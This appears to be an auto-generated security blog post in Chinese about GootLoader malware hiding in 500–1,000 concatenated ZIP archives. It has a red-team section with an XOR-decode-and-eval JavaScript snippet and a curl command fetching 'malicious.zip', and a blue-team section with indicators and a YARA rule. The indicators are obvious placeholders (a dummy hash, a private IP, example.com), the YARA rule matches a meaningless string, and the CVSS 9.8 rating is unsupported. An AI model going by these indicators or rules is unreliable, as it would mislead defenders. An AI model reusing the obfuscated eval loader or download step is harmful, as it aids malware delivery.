---
layout: post
title:  "GootLoader Malware Uses 500–1,000 Concatenated ZIP Archives to Evade Detection"
date:   2026-01-16 18:23:19 +0000
categories: [security]
---

# 🚨 GootLoader 惡意程式碼分析：解析與防禦技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Malformed ZIP Archive`, `Hashbusting`, `JavaScript Obfuscation`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: GootLoader 惡意程式碼使用了一種特殊的 ZIP 檔案格式，該格式通過串聯 500-1000 個 ZIP 檔案來繞過防病毒軟件的檢測。這種技術稱為 `Hashbusting`，使得每個下載的 ZIP 檔案都具有唯一的雜湊值，從而難以被防病毒軟件檢測到。
* **攻擊流程圖解**: 
  1. 使用者下載 ZIP 檔案
  2. ZIP 檔案被 Windows 預設的解壓縮工具解壓
  3. 解壓後的 JavaScript 檔案被執行
  4. JavaScript 檔案創建了一個 Windows 快捷方式（LNK 檔案）在啟動文件夾中
  5. LNK 檔案執行第二個 JavaScript 檔案，該檔案使用 `cscript` 執行
  6. PowerShell 命令被用來收集系統信息和從遠程伺服器接收命令
* **受影響元件**: Windows 作業系統，特別是使用預設解壓縮工具的版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要下載和執行 ZIP 檔案
* **Payload 建構邏輯**:

    ```
        
        javascript
          // 範例 JavaScript Payload
          var payload = "XOR-encoded blob";
          var decodedPayload = "";
          for (var i = 0; i < payload.length; i++) {
            decodedPayload += String.fromCharCode(payload.charCodeAt(i) ^ 0x12);
          }
          eval(decodedPayload);
        
        
    
    ```
  *範例指令*: 使用 `curl` 下載 ZIP 檔案，然後使用 `unzip` 解壓縮

```

bash
  curl -o example.zip https://example.com/malicious.zip
  unzip example.zip

```
* **繞過技術**: GootLoader 使用 `Hashbusting` 技術來繞過防病毒軟件的檢測。另外，使用者需要下載和執行 ZIP 檔案，這使得攻擊者可以使用社會工程學技巧來欺騙使用者。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
|---|---|---|---|
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Users\username\Downloads\example.zip |


* **偵測規則 (Detection Rules)**:

    ```
        
        yara
          rule GootLoader {
            meta:
              description = "GootLoader Malware Detection"
              author = "Your Name"
            strings:
              $js_payload = { 61 73 63 72 69 70 74 20 70 61 79 6c 6f 61 64 }
            condition:
              $js_payload at 0
          }
        
        
    
    ```
  或者使用 SIEM 查詢語法：

```

sql
  SELECT * FROM logs WHERE event_type = "file_download" AND file_name = "example.zip"

```
* **緩解措施**: 
  1. 阻止 `wscript.exe` 和 `cscript.exe` 執行下載的內容
  2. 使用群組政策物件（GPO）設定 JavaScript 檔案預設開啟為 Notepad，而不是 `wscript.exe`
  3. 更新防病毒軟件和作業系統

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Hashbusting**: 一種技術，通過修改檔案的內容來改變其雜湊值，從而難以被防病毒軟件檢測到。可以想像成一個檔案的指紋，通過修改檔案的內容，可以改變其指紋。
* **Malformed ZIP Archive**: 一種特殊的 ZIP 檔案格式，通過串聯多個 ZIP 檔案來繞過防病毒軟件的檢測。可以想像成一個 ZIP 檔案的拼圖，通過修改拼圖的內容，可以改變其整體結構。
* **JavaScript Obfuscation**: 一種技術，通過修改 JavaScript 代碼來難以被人類閱讀和理解。可以想像成一個密碼，通過修改密碼的內容，可以難以被破解。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/gootloader-malware-uses-5001000.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)

